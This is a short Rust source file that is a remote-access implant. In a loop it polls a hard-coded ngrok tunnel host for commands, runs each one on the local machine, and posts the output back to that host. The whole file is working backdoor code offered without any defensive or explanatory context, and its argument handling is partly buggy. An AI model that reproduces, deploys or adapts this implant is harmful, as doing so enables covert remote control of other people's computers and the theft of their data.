use std::env;
use std::process::Command;
use std::str;

static PROTO: &str = "https";
static ADDR: &str = "9023-2814-1b94-6bc-c000-83ec-fc77-ba8f-55db.ngrok-free.app";
//fn addr() -> Vec<String> {
//        env::args().collect()
//}
static PORT: u32 = 443;

#[tokio::main]

async fn res() -> String{
    //let ngrok = addr();
    let url = format!("{}://{}:{}", PROTO, ADDR, PORT); //ngrok[1]
    match reqwest::get(url).await{
        Ok(_res) =>{
            let res = _res.text().await.unwrap();
            res
        }
        Err(_) =>{
            return format!("{}", "");
        }
    }
}
fn req(data: &str){
    //let ngrok = addr();
    let url = format!("{}://{}:{}", PROTO, ADDR, PORT); //ngrok[1]
    let body = format!("{}", data);
    let client = reqwest::blocking::Client::new();
    match client.post(url).body(body).send() {
        Ok(_) =>{}
        Err(_) =>{}
    }
}
fn exec(cmd: &str) -> String{
    let args: Vec<&str> = cmd.split_whitespace().collect();
    if args.len() < 1{
        return format!("{}", "");
    }
    match args[1]{
        "cd" =>{
            match env::set_current_dir(args[2]){
                Ok(_) =>{}
                Err(_) =>{}
            }
    }
        _ =>{
        }
    }
    let out = Command::new(args[0]).args(&args[1..]).output();
    match out{
        Ok(_out) =>{
            let output = String::from_utf8_lossy(&_out.stdout).to_string();
            output
        }
        Err(_) =>{
            return format!("{}", "");
        }
    }
}
fn main(){
    loop{
        let cmd = res();
        let data = exec(&cmd);
        req(&data);
    }
}
